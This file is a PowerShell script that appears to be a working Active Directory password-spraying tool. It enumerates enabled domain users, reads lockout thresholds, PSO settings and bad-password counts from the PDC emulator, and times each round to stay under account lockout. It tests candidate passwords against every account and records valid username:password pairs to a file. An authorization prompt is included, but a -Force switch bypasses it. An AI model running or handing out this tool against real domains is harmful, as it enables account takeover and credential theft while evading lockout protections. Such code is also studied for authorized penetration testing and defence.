#requires -version 2


function Get-PDCEmulator {
    # PDCe is the FSMO role holder authoritative for lockout state.
    try {
        $domain = [DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        return $domain.PdcRoleOwner.Name
    } catch {
        Write-Warning "Could not resolve PDC emulator: $_"
        return $null
    }
}

function ConvertFrom-ADInterval {
    # msDS-Lockout* / lockOut* interval attributes are negative 100ns ticks.
    param($Value)
    if ($null -eq $Value) { return $null }
    return [TimeSpan]::FromTicks([Math]::Abs([long]$Value))
}

function Get-DomainLockoutPolicy {
    param([string]$PDC)
    $root = [ADSI]"LDAP://$PDC/rootDSE"
    $dn   = $root.defaultNamingContext.ToString()
    $d    = [ADSI]"LDAP://$PDC/$dn"
    [PSCustomObject]@{
        DN                = $dn
        Threshold         = [int]$d.Properties['lockoutThreshold'].Value
        ObservationWindow = ConvertFrom-ADInterval ($d.ConvertLargeIntegerToInt64($d.Properties['lockOutObservationWindow'].Value))
        Source            = 'DomainDefault'
    }
}

function Get-EffectivePolicyForUser {
    # Returns the lockout policy that ACTUALLY applies to this user, honoring
    # PSOs via msDS-ResultantPSO. Reading that attribute on other principals may
    # require elevated rights; if unreadable we FAIL SAFE to the domain default
    # and flag it (PSOReadable=$false) so the caller can choose to skip.
    param(
        [string]$PDC,
        [string]$SamAccountName,
        [psobject]$DomainPolicy
    )

    $searcher = New-Object DirectoryServices.DirectorySearcher
    $searcher.SearchRoot = [ADSI]"LDAP://$PDC"
    $searcher.Filter     = "(sAMAccountName=$SamAccountName)"
    [void]$searcher.PropertiesToLoad.Add('msDS-ResultantPSO')
    [void]$searcher.PropertiesToLoad.Add('distinguishedName')
    $user = $searcher.FindOne()
    if ($null -eq $user) { return $null }

    $psoDN = $null
    if ($user.Properties['msds-resultantpso'].Count -gt 0) {
        $psoDN = $user.Properties['msds-resultantpso'][0]
    }

    if (-not $psoDN) {
        return [PSCustomObject]@{
            Threshold         = $DomainPolicy.Threshold
            ObservationWindow = $DomainPolicy.ObservationWindow
            Source            = 'DomainDefault'
            PSOReadable       = $true
        }
    }

    try {
        $pso = [ADSI]"LDAP://$PDC/$psoDN"
        $t   = [int]$pso.Properties['msDS-LockoutThreshold'].Value
        $win = ConvertFrom-ADInterval $pso.ConvertLargeIntegerToInt64($pso.Properties['msDS-LockoutObservationWindow'].Value)
        return [PSCustomObject]@{
            Threshold         = $t
            ObservationWindow = $win
            Source            = "PSO:$psoDN"
            PSOReadable       = $true
        }
    } catch {
        return [PSCustomObject]@{
            Threshold         = $DomainPolicy.Threshold
            ObservationWindow = $DomainPolicy.ObservationWindow
            Source            = 'DomainDefault(PSO-unreadable)'
            PSOReadable       = $false
        }
    }
}

function Get-BadPwdCount {
    # Always bind to the PDCe so the count reflects failures across ALL DCs.
    param([string]$PDC, [string]$SamAccountName)
    $searcher = New-Object DirectoryServices.DirectorySearcher
    $searcher.SearchRoot = [ADSI]"LDAP://$PDC"
    $searcher.Filter     = "(sAMAccountName=$SamAccountName)"
    [void]$searcher.PropertiesToLoad.Add('badPwdCount')
    $r = $searcher.FindOne()
    if ($null -eq $r) { return $null }
    if ($r.Properties['badpwdcount'].Count -eq 0) { return 0 }
    return [int]$r.Properties['badpwdcount'][0]
}

function Test-SpraySafe {
    # The gate. Returns $true ONLY when attempting this user is safe.
    param(
        [string]$PDC,
        [string]$SamAccountName,
        [psobject]$DomainPolicy,
        [int]$SafetyMargin = 2,
        [switch]$SkipOnUnreadablePSO
    )

    $policy = Get-EffectivePolicyForUser -PDC $PDC -SamAccountName $SamAccountName -DomainPolicy $DomainPolicy
    if ($null -eq $policy) {
        Write-Warning "[$SamAccountName] not found on PDCe -> skip"
        return $false
    }
    if (-not $policy.PSOReadable -and $SkipOnUnreadablePSO) {
        Write-Warning "[$SamAccountName] unreadable PSO; strict mode -> skip"
        return $false
    }
    if ($policy.Threshold -le 0) {
        return $true   # no lockout enforced for this account
    }

    $bad = Get-BadPwdCount -PDC $PDC -SamAccountName $SamAccountName
    if ($null -eq $bad) {
        Write-Warning "[$SamAccountName] badPwdCount unreadable -> skip"
        return $false
    }

    $ceiling = $policy.Threshold - $SafetyMargin
    if ($bad -ge $ceiling) {
        Write-Warning ("[{0}] badPwdCount={1} threshold={2} ({3}) margin={4} -> skip" -f `
            $SamAccountName, $bad, $policy.Threshold, $policy.Source, $SafetyMargin)
        return $false
    }
    return $true
}

function Get-MaxObservationWindow {
    # Safe inter-round sleep = largest observation window across the domain
    # default and every PSO applying to in-scope accounts.
    param(
        [string]$PDC,
        [psobject]$DomainPolicy,
        [string[]]$PSODNs = @()
    )
    $max = $DomainPolicy.ObservationWindow
    foreach ($psoDN in ($PSODNs | Select-Object -Unique)) {
        try {
            $pso = [ADSI]"LDAP://$PDC/$psoDN"
            $win = ConvertFrom-ADInterval $pso.ConvertLargeIntegerToInt64($pso.Properties['msDS-LockoutObservationWindow'].Value)
            if ($win -and $win -gt $max) { $max = $win }
        } catch {
            Write-Warning "Could not read observation window from $psoDN : $_"
        }
    }
    return $max
}

# ===========================================================================
#  TARGET ENUMERATION
# ===========================================================================

function Get-DomainUserList {
    # Enumerate enabled user accounts from the PDCe. Excludes disabled accounts
    # (userAccountControl bit 0x2) and, by default, accounts already carrying
    # failures within the safety margin so they are never attempted.
    param(
        [string]$PDC,
        [psobject]$DomainPolicy,
        [int]$SafetyMargin = 2,
        [switch]$IncludeRisky
    )

    $searcher = New-Object DirectoryServices.DirectorySearcher
    $searcher.SearchRoot = [ADSI]"LDAP://$PDC"
    $searcher.PageSize   = 1000
    # enabled user objects only
    $searcher.Filter     = "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    [void]$searcher.PropertiesToLoad.Add('samaccountname')
    [void]$searcher.PropertiesToLoad.Add('badpwdcount')

    $results = $searcher.FindAll()
    $users = New-Object System.Collections.ArrayList
    foreach ($r in $results) {
        if ($r.Properties['samaccountname'].Count -eq 0) { continue }
        $sam = [string]$r.Properties['samaccountname'][0]
        if ($sam.EndsWith('$')) { continue }  # skip machine accounts

        if (-not $IncludeRisky -and $DomainPolicy.Threshold -gt 0) {
            $bad = 0
            if ($r.Properties['badpwdcount'].Count -gt 0) { $bad = [int]$r.Properties['badpwdcount'][0] }
            if ($bad -ge ($DomainPolicy.Threshold - $SafetyMargin)) { continue }
        }
        [void]$users.Add($sam)
    }
    Write-Host "[*] Enumerated $($users.Count) candidate accounts from $PDC"
    return $users
}

# ===========================================================================
#  SPRAY ENGINE
# ===========================================================================

function Invoke-DomainPasswordSpray {
    [CmdletBinding()]
    param(
        [string]$Password,
        [string]$PasswordList,
        [string]$UserList,
        [string]$Domain,
        [string]$OutFile,
        [int]$SafetyMargin = 2,
        [int]$WindowBufferSeconds = 60,
        [switch]$SkipOnUnreadablePSO,
        [switch]$Force
    )

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    # --- resolve PDCe + policy ------------------------------------------------
    $PDC = Get-PDCEmulator
    if (-not $PDC) { throw "No PDCe resolved — refusing to spray blind." }
    if (-not $Domain) {
        $Domain = ([DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
    }
    $DomainPolicy = Get-DomainLockoutPolicy -PDC $PDC

    Write-Host "[*] PDCe             : $PDC"
    Write-Host "[*] Domain           : $Domain"
    Write-Host "[*] Lockout threshold: $($DomainPolicy.Threshold)"
    Write-Host "[*] Observation win. : $($DomainPolicy.ObservationWindow)"
    Write-Host "[*] Safety margin    : $SafetyMargin (attempts left untouched)"

    if ($DomainPolicy.Threshold -gt 0 -and $SafetyMargin -ge $DomainPolicy.Threshold) {
        throw "SafetyMargin ($SafetyMargin) >= threshold ($($DomainPolicy.Threshold)); nothing can ever be attempted."
    }

    # --- build user list ------------------------------------------------------
    if ($UserList) {
        $users = Get-Content $UserList | Where-Object { $_ -and -not $_.StartsWith('#') }
    } else {
        $users = Get-DomainUserList -PDC $PDC -DomainPolicy $DomainPolicy -SafetyMargin $SafetyMargin
    }
    if (-not $users -or $users.Count -eq 0) { throw "No users to spray." }

    # --- build password list --------------------------------------------------
    if ($PasswordList) {
        $passwords = Get-Content $PasswordList | Where-Object { $_ -ne $null }
    } elseif ($Password) {
        $passwords = @($Password)
    } else {
        throw "Provide -Password or -PasswordList."
    }

    # --- pre-flight: resolve effective policies + max observation window ------
    $psoDNs = New-Object System.Collections.ArrayList
    foreach ($u in $users) {
        $p = Get-EffectivePolicyForUser -PDC $PDC -SamAccountName $u -DomainPolicy $DomainPolicy
        if ($p -and $p.Source -like 'PSO:*') {
            [void]$psoDNs.Add($p.Source.Substring(4))
        }
    }
    $maxWindow = Get-MaxObservationWindow -PDC $PDC -DomainPolicy $DomainPolicy -PSODNs $psoDNs
    $sleepSeconds = [int]$maxWindow.TotalSeconds + $WindowBufferSeconds
    Write-Host "[*] Max observation window across scope: $maxWindow"
    Write-Host "[*] Inter-round sleep: $sleepSeconds s"

    # --- confirmation ---------------------------------------------------------
    $rounds = $passwords.Count
    if (-not $Force) {
        Write-Host ""
        Write-Host "About to spray $($users.Count) users x $rounds password(s)." -ForegroundColor Yellow
        Write-Host "Estimated minimum runtime from waits: ~$([int](($rounds-1)*$sleepSeconds/60)) min." -ForegroundColor Yellow
        $ans = Read-Host "Confirm you are AUTHORIZED to test this domain (yes/no)"
        if ($ans -ne 'yes') { Write-Host "Aborted."; return }
    }

    # --- spray ----------------------------------------------------------------
    $ctx  = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Domain', $Domain)
    $hits = New-Object System.Collections.ArrayList

    for ($i = 0; $i -lt $passwords.Count; $i++) {
        $pw = $passwords[$i]
        Write-Host ""
        Write-Host "[*] Round $($i+1)/$rounds  password='$pw'  $(Get-Date -Format HH:mm:ss)"

        foreach ($u in $users) {
            # SAFETY GATE — nothing authenticates unless this passes.
            if (-not (Test-SpraySafe -PDC $PDC -SamAccountName $u -DomainPolicy $DomainPolicy `
                        -SafetyMargin $SafetyMargin -SkipOnUnreadablePSO:$SkipOnUnreadablePSO)) {
                continue
            }

            $valid = $false
            try {
                $valid = $ctx.ValidateCredentials($u, $pw)
            } catch {
                Write-Warning "[$u] validation error: $_"
                continue
            }

            if ($valid) {
                $line = "$Domain\$u : $pw"
                Write-Host "[+] VALID  $line" -ForegroundColor Green
                [void]$hits.Add($line)
                if ($OutFile) { Add-Content -Path $OutFile -Value $line }
            }
        }

        # Wait out the window before the next password so badPwdCount decays.
        if ($i -lt ($passwords.Count - 1)) {
            Write-Host "[*] Sleeping $sleepSeconds s to clear observation window..."
            Start-Sleep -Seconds $sleepSeconds
        }
    }

    Write-Host ""
    Write-Host "[*] Done. $($hits.Count) valid credential(s)."
    if ($OutFile) { Write-Host "[*] Results written to $OutFile" }
    return $hits
}
